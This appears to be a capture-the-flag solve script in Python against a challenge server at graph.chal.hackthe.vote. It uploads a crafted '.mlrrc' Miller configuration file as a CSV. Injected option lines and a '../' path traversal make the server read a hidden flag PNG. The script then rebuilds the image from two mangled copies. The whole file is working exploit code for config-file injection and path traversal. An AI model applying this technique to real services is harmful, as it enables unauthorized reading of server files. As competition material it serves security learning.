from struct import unpack

import requests


SERVER = 'http://graph.chal.hackthe.vote'

# PART 1: getting mangled flag png
s = requests.Session()
s.get(SERVER + '/signin')
# mlr --icsvlite --opprint -N cat $file
s.post(
    SERVER + '/data',
    files={
        'csv': (
            '.mlrrc',
            '''--from\t../872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e/flag2.png#,
--ragged#,
--ifs\tJALSKDJFLASKJDF#,
--ofs\tZalsdKJFASKDFJ#,
--irs\t\\x01#,
--ofs\t\\x01#,
''',
            'text/csv',
        )
    },
)
png01 = s.get(SERVER + '/getfile/.mlrrc').content
s.post(
    SERVER + '/data',
    files={
        'csv': (
            '.mlrrc',
            '''--from\t../872bfdd01752ea2641a3e211db6127a7af1d9b44f1602780bbae465ccf4ac25e/flag2.png#,
--ragged#,
--ifs\tJALSKDJFLASKJDF#,
--ofs\tZalsdKJFASKDFJ#,
--irs\t\\x02#,
--ofs\t\\x02#,
''',
            'text/csv',
        )
    },
)
png02 = s.get(SERVER + '/getfile/.mlrrc').content

# PART 2: unmangling flag png

# Strip off payload from end
png01 = png01[: png01.rfind(b'IEND') + 8]
png02 = png02[: png02.rfind(b'IEND') + 8]

i1, i2 = 0, 0
png = []
while i1 < len(png01) and i2 < len(png02):
    if png01[i1] == png02[i2]:
        png.append(png01[i1])
        i1 += 1
        i2 += 1
    elif png02[i2] == 1:
        while png02[i2] == 1:
            png.append(png02[i2])
            i2 += 1
        i1 += 1
    elif png01[i1] == 2:
        while png01[i1] == 2:
            png.append(png01[i1])
            i1 += 1
        i2 += 1
png = bytes(png)

# sanity check IDAT section
idat_index = png.find(b'IDAT')
actual_idat_size = unpack(">H", png[idat_index - 2:idat_index])[0]
assert actual_idat_size == png.rfind(b'IEND') - 12 - png.find(b'IDAT')

with open('flag2.png', 'wb') as f:
    f.write(png)
print('view flag2.png')
